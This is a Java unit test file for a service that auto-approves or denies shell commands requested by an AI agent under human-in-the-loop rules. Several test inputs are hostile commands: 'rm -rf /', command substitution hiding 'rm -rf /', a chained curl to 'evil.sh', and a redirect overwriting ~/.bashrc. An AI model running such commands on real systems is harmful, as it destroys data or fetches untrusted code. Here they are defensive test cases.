package com.kratisai.controlplane.service;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.kratisai.controlplane.api.restdto.CreateHitlRuleRequest;
import com.kratisai.controlplane.api.restdto.HitlRuleDto;
import com.kratisai.controlplane.api.wsdto.HitlResponse;
import com.kratisai.controlplane.model.HitlRule;
import com.kratisai.controlplane.model.HitlRuleAction;
import com.kratisai.controlplane.model.HitlRuleType;
import com.kratisai.controlplane.model.Team;
import com.kratisai.controlplane.model.User;
import com.kratisai.controlplane.model.event.TeamEntityChangedEvent;
import com.kratisai.controlplane.model.event.TeamEntityType;
import com.kratisai.controlplane.repository.HitlRuleRepository;
import com.kratisai.controlplane.repository.TeamMemberRepository;
import com.kratisai.controlplane.repository.TeamRepository;
import com.kratisai.controlplane.repository.UserRepository;
import java.time.Instant;
import java.util.List;
import java.util.Optional;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.context.ApplicationEventPublisher;
import org.springframework.http.HttpStatus;
import org.springframework.web.server.ResponseStatusException;

@ExtendWith(MockitoExtension.class)
class HitlRuleServiceTest {

    @Mock
    private HitlRuleRepository ruleRepository;

    @Mock
    private TeamMemberRepository teamMemberRepository;

    @Mock
    private TeamRepository teamRepository;

    @Mock
    private UserRepository userRepository;

    @Mock
    private ApplicationEventPublisher eventPublisher;

    private HitlRuleService service;

    private final UUID userId = UUID.randomUUID();
    private final UUID teamId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        service = new HitlRuleService(
                ruleRepository, teamMemberRepository, teamRepository, userRepository, eventPublisher);
    }

    @Test
    void autoResolve_denyMatches_returnsDeny() {
        HitlRule denyRule = new HitlRule();
        denyRule.setCommandRoot("rm -rf");
        denyRule.setRuleType(HitlRuleType.PREFIX_WILD);
        denyRule.setAction(HitlRuleAction.DENY);

        Optional<HitlResponse> decision = HitlRuleService.autoResolve(List.of(denyRule), "rm -rf /");
        assertThat(decision).isEqualTo(Optional.of(HitlResponse.DECLINED));
    }

    @Test
    void autoResolve_denyAndAllowBothMatch_denyTakesImmediatePrecedence() {
        HitlRule allowRule = new HitlRule();
        allowRule.setCommandRoot("git");
        allowRule.setRuleType(HitlRuleType.PREFIX_WILD);
        allowRule.setAction(HitlRuleAction.ALLOW);

        HitlRule denyRule = new HitlRule();
        denyRule.setCommandRoot("git push --force");
        denyRule.setRuleType(HitlRuleType.PREFIX_WILD);
        denyRule.setAction(HitlRuleAction.DENY);

        // Deny rule first
        assertThat(HitlRuleService.autoResolve(List.of(denyRule, allowRule), "git push --force origin main"))
                .isEqualTo(Optional.of(HitlResponse.DECLINED));

        // Allow rule first - Deny must still take precedence!
        assertThat(HitlRuleService.autoResolve(List.of(allowRule, denyRule), "git push --force origin main"))
                .isEqualTo(Optional.of(HitlResponse.DECLINED));
    }

    @Test
    void autoResolve_allowMatchesAndNoDeny_returnsAllow() {
        HitlRule allowRule = new HitlRule();
        allowRule.setCommandRoot("git status");
        allowRule.setRuleType(HitlRuleType.EXACT);
        allowRule.setAction(HitlRuleAction.ALLOW);

        Optional<HitlResponse> decision = HitlRuleService.autoResolve(List.of(allowRule), "git status");
        assertThat(decision).isEqualTo(Optional.of(HitlResponse.APPROVED));
    }

    @Test
    void autoResolve_noRuleMatches_returnsNone() {
        HitlRule allowRule = new HitlRule();
        allowRule.setCommandRoot("git status");
        allowRule.setRuleType(HitlRuleType.EXACT);
        allowRule.setAction(HitlRuleAction.ALLOW);

        Optional<HitlResponse> decision = HitlRuleService.autoResolve(List.of(allowRule), "git push");
        assertThat(decision).isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_emptyOrNullRules_returnsNone() {
        assertThat(HitlRuleService.autoResolve(List.of(), "echo hello")).isEqualTo(Optional.empty());
        assertThat(HitlRuleService.autoResolve(null, "echo hello")).isEqualTo(Optional.empty());
        assertThat(HitlRuleService.autoResolve(List.of(), null)).isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_compositeCommand_allSegmentsAllowed_returnsAllow() {
        HitlRule npmTest = prefixAllow("npm run test");
        HitlRule gitStatus = prefixAllow("git status");

        assertThat(HitlRuleService.autoResolve(List.of(npmTest, gitStatus), "npm run test src/x.test.ts"))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
        assertThat(HitlRuleService.autoResolve(List.of(npmTest, gitStatus), "npm run test && git status"))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
        assertThat(HitlRuleService.autoResolve(List.of(npmTest, gitStatus), "git status | grep foo"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_compositeCommand_oneSegmentUncovered_returnsNone() {
        HitlRule gitStatus = prefixAllow("git status");

        assertThat(HitlRuleService.autoResolve(List.of(gitStatus), "git status && curl https://evil.sh"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_denyInsideCompositeCommand_denies() {
        HitlRule allowAll = prefixAllow("git");
        HitlRule denyForce = new HitlRule();
        denyForce.setCommandRoot("git push --force");
        denyForce.setRuleType(HitlRuleType.PREFIX_WILD);
        denyForce.setAction(HitlRuleAction.DENY);

        assertThat(HitlRuleService.autoResolve(List.of(allowAll, denyForce), "git status && git push --force"))
                .isEqualTo(Optional.of(HitlResponse.DECLINED));
    }

    @Test
    void autoResolve_prefixWildRequiresTokenBoundary() {
        HitlRule npmTest = prefixAllow("npm run test");

        assertThat(HitlRuleService.autoResolve(List.of(npmTest), "npm run test file.spec.ts"))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
        assertThat(HitlRuleService.autoResolve(List.of(npmTest), "npm run tests-backdoor"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_commandSubstitution_neverAutoAllows() {
        HitlRule echo = prefixAllow("echo");

        assertThat(HitlRuleService.autoResolve(List.of(echo), "echo $(rm -rf /)"))
                .isEqualTo(Optional.empty());
        assertThat(HitlRuleService.autoResolve(List.of(echo), "echo `whoami`")).isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_envAssignmentOrRedirection_neverAutoAllows() {
        HitlRule npmTest = prefixAllow("npm run test");
        HitlRule curl = prefixAllow("curl");

        assertThat(HitlRuleService.autoResolve(List.of(npmTest), "NODE_ENV=test npm run test"))
                .isEqualTo(Optional.empty());
        assertThat(HitlRuleService.autoResolve(List.of(curl), "curl https://example.com > ~/.bashrc"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_unparseableCommandWithEmbeddedDenyText_fallsThroughToHitl() {
        HitlRule denyRm = new HitlRule();
        denyRm.setCommandRoot("rm -rf");
        denyRm.setRuleType(HitlRuleType.PREFIX_WILD);
        denyRm.setAction(HitlRuleAction.DENY);
        HitlRule echo = prefixAllow("echo");

        assertThat(HitlRuleService.autoResolve(List.of(denyRm, echo), "echo $(rm -rf /)"))
                .isEqualTo(Optional.empty());
    }

    private static HitlRule prefixAllow(String root) {
        HitlRule rule = new HitlRule();
        rule.setCommandRoot(root);
        rule.setRuleType(HitlRuleType.PREFIX_WILD);
        rule.setAction(HitlRuleAction.ALLOW);
        return rule;
    }

    private static HitlRule toolKindRule(String kind, HitlRuleAction action) {
        HitlRule rule = new HitlRule();
        rule.setCommandRoot(kind);
        rule.setRuleType(HitlRuleType.TOOL_KIND);
        rule.setAction(action);
        return rule;
    }

    @Test
    void autoResolve_toolKindAllowRule_approvesEditRequest() {
        assertThat(HitlRuleService.autoResolve(
                        List.of(toolKindRule("edit", HitlRuleAction.ALLOW)), "/ws/foo.txt /ws/foo.txt", "edit"))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
    }

    @Test
    void autoResolve_toolKindDenyRule_declinesEditRequest() {
        assertThat(HitlRuleService.autoResolve(
                        List.of(toolKindRule("edit", HitlRuleAction.DENY)), "/ws/foo.txt", "edit"))
                .isEqualTo(Optional.of(HitlResponse.DECLINED));
    }

    @Test
    void autoResolve_noToolKindRule_editRequestStaysPending() {
        assertThat(HitlRuleService.autoResolve(List.of(), "/ws/foo.txt", "edit"))
                .isEqualTo(Optional.empty());
        assertThat(HitlRuleService.autoResolve(
                        List.of(toolKindRule("write", HitlRuleAction.ALLOW)), "/ws/foo.txt", "edit"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_toolKindMatchingIsCaseInsensitive() {
        assertThat(HitlRuleService.autoResolve(
                        List.of(toolKindRule("edit", HitlRuleAction.ALLOW)), "/ws/foo.txt", "EDIT"))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
    }

    @Test
    void autoResolve_textRule_doesNotApplyToEditKind() {
        assertThat(HitlRuleService.autoResolve(List.of(prefixAllow("/ws")), "/ws/foo.txt", "edit"))
                .isEqualTo(Optional.empty());
    }

    @Test
    void autoResolve_toolKindExecuteRule_approvesAnyCommand() {
        assertThat(HitlRuleService.autoResolve(
                        List.of(toolKindRule("execute", HitlRuleAction.ALLOW)), "rm -rf /tmp/x", null))
                .isEqualTo(Optional.of(HitlResponse.APPROVED));
    }

    @Test
    void autoResolve_toolKindDenyBeatsTextAllow() {
        assertThat(HitlRuleService.autoResolve(
                        List.of(prefixAllow("git"), toolKindRule("execute", HitlRuleAction.DENY)),
                        "git status",
                        "execute"))
                .isEqualTo(Optional.of(HitlResponse.DECLINED));
    }

    @Test
    void listRules_nonMember_throwsForbidden() {
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(false);

        assertThatThrownBy(() -> service.listRules(userId, teamId))
                .isInstanceOf(ResponseStatusException.class)
                .satisfies(e -> assertThat(((ResponseStatusException) e).getStatusCode())
                        .isEqualTo(HttpStatus.FORBIDDEN));
    }

    @Test
    void listRules_member_returnsList() {
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(true);

        Team team = new Team();
        team.setId(teamId);

        User user = new User();
        user.setId(userId);
        user.setDisplayName("Alice");

        HitlRule rule = new HitlRule();
        rule.setId(UUID.randomUUID());
        rule.setTeam(team);
        rule.setCommandRoot("npm test");
        rule.setRuleType(HitlRuleType.EXACT);
        rule.setAction(HitlRuleAction.ALLOW);
        rule.setCreatedBy(user);
        rule.setCreatedAt(Instant.now());

        when(ruleRepository.findByTeamIdOrderByCreatedAtDesc(teamId)).thenReturn(List.of(rule));

        List<HitlRuleDto> result = service.listRules(userId, teamId);
        assertThat(result).hasSize(1);
        assertThat(result.getFirst().commandRoot()).isEqualTo("npm test");
        assertThat(result.getFirst().createdByName()).isEqualTo("Alice");
    }

    @Test
    void createRule_duplicate_throwsConflict() {
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(true);
        when(teamRepository.findById(teamId)).thenReturn(Optional.of(new Team()));
        when(ruleRepository.existsByTeamIdAndCommandRootAndRuleTypeAndAction(
                        teamId, "ls", HitlRuleType.EXACT, HitlRuleAction.ALLOW))
                .thenReturn(true);

        CreateHitlRuleRequest req = new CreateHitlRuleRequest("ls", HitlRuleType.EXACT, HitlRuleAction.ALLOW);

        assertThatThrownBy(() -> service.createRule(userId, teamId, req))
                .isInstanceOf(ResponseStatusException.class)
                .satisfies(e -> assertThat(((ResponseStatusException) e).getStatusCode())
                        .isEqualTo(HttpStatus.CONFLICT));

        verify(ruleRepository, never()).save(any());
        verify(eventPublisher, never()).publishEvent(any());
    }

    @Test
    void createRule_success_savesAndPublishesEvent() {
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(true);
        Team team = new Team();
        team.setId(teamId);
        when(teamRepository.findById(teamId)).thenReturn(Optional.of(team));

        when(ruleRepository.existsByTeamIdAndCommandRootAndRuleTypeAndAction(
                        teamId, "cargo build", HitlRuleType.PREFIX_WILD, HitlRuleAction.ALLOW))
                .thenReturn(false);

        User user = new User();
        user.setId(userId);
        user.setDisplayName("Bob");
        when(userRepository.findById(userId)).thenReturn(Optional.of(user));

        when(ruleRepository.save(any(HitlRule.class))).thenAnswer(inv -> {
            HitlRule r = inv.getArgument(0);
            r.setId(UUID.randomUUID());
            return r;
        });

        CreateHitlRuleRequest req =
                new CreateHitlRuleRequest("cargo build", HitlRuleType.PREFIX_WILD, HitlRuleAction.ALLOW);
        HitlRuleDto result = service.createRule(userId, teamId, req);

        assertThat(result.commandRoot()).isEqualTo("cargo build");
        assertThat(result.createdByName()).isEqualTo("Bob");

        ArgumentCaptor<TeamEntityChangedEvent> eventCaptor = ArgumentCaptor.forClass(TeamEntityChangedEvent.class);
        verify(eventPublisher).publishEvent(eventCaptor.capture());
        assertThat(eventCaptor.getValue().teamId()).isEqualTo(teamId);
        assertThat(eventCaptor.getValue().type()).isEqualTo(TeamEntityType.PERMISSIONS);
    }

    @Test
    void deleteRule_notFound_throwsNotFound() {
        UUID ruleId = UUID.randomUUID();
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(true);
        when(ruleRepository.findByIdAndTeamId(ruleId, teamId)).thenReturn(Optional.empty());

        assertThatThrownBy(() -> service.deleteRule(userId, teamId, ruleId))
                .isInstanceOf(ResponseStatusException.class)
                .satisfies(e -> assertThat(((ResponseStatusException) e).getStatusCode())
                        .isEqualTo(HttpStatus.NOT_FOUND));

        verify(ruleRepository, never()).delete(any());
        verify(eventPublisher, never()).publishEvent(any());
    }

    @Test
    void deleteRule_success_deletesAndPublishesEvent() {
        UUID ruleId = UUID.randomUUID();
        when(teamMemberRepository.existsByTeamIdAndUserId(teamId, userId)).thenReturn(true);

        HitlRule rule = new HitlRule();
        rule.setId(ruleId);
        when(ruleRepository.findByIdAndTeamId(ruleId, teamId)).thenReturn(Optional.of(rule));

        service.deleteRule(userId, teamId, ruleId);

        verify(ruleRepository).delete(rule);
        ArgumentCaptor<TeamEntityChangedEvent> eventCaptor = ArgumentCaptor.forClass(TeamEntityChangedEvent.class);
        verify(eventPublisher).publishEvent(eventCaptor.capture());
        assertThat(eventCaptor.getValue().teamId()).isEqualTo(teamId);
        assertThat(eventCaptor.getValue().type()).isEqualTo(TeamEntityType.PERMISSIONS);
    }
}
